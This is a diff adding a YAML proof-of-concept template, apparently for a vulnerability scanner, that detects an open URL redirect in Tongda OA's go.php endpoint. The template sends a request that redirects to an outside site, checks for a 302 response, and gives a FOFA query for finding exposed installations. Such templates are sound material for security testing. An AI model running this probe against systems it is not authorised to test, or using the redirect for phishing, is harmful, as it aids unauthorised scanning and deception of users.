@@ -1,0 +1,15 @@
+id: poc-yaml-tongda-oa-go-any-redirect
+info:
+  name: 通达OA go.php存在URL跳转漏洞
+  severity: medium
+  tags:
+  - url重定向
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /ispirit/go.php?URL=http://www.baidu.com
+  expression: "status_code == 302 && \ncontains(headers,\"Location: http://www.baidu.com\"\
+    ) &&\nbody == \"\"\n"
+variables: {}
+transport: http
